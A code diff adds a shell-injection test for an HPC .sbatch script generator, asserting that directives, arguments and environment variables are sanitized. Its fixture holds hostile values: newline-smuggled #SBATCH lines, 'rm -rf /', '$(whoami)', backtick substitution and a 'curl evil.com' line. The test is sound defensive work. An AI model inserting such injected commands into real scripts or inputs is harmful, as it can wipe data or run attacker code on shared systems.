@@ -132,4 +132,33 @@ test("HPC .sbatch Generator", async (t) => {
       "Native command should be wrapped with unshare -n -r",
     );
   });
+
+  await t.test("sanitizes #SBATCH directives, env variables, and arguments against shell injection", () => {
+    const maliciousSpec: HpcJobSpec = {
+      jobId: "inj-1",
+      name: "test\n#SBATCH --partition=root\nrm -rf /",
+      command: "echo",
+      args: ["hello; rm -rf /", "$(whoami)"],
+      workingDir: "/workspace",
+      modules: ["openmpi/4.1\ncurl evil.com"],
+      env: {
+        VALID_KEY: 'val"$(id)`uname`',
+        "INVALID-KEY;rm": "ignored",
+      },
+      resources: {
+        partition: "compute\n#SBATCH --exclusive",
+      },
+    };
+
+    const sbatch = generateSbatchScript(maliciousSpec);
+    const sbatchDirectives = sbatch.split("\n").filter((l) => l.startsWith("#SBATCH"));
+
+    assert.ok(!sbatchDirectives.some((l) => l.includes("--partition=root")), "Must prevent directive injection");
+    assert.ok(!sbatchDirectives.some((l) => l.includes("--exclusive")), "Must prevent partition newline injection");
+    assert.ok(!sbatch.includes("\nrm -rf /"), "Must strip injected newline commands");
+    assert.ok(!sbatch.includes("INVALID-KEY"), "Must reject invalid env variable keys");
+    assert.ok(sbatch.includes('export VALID_KEY="val\\"\\$(id)\\`uname\\`"'), "Must escape $, `, and quotes in env");
+    assert.ok(sbatch.includes('"hello; rm -rf /"'), "Must quote args with semicolons");
+    assert.ok(sbatch.includes('"\\$(whoami)"'), "Must escape command substitution in args");
+  });
 });
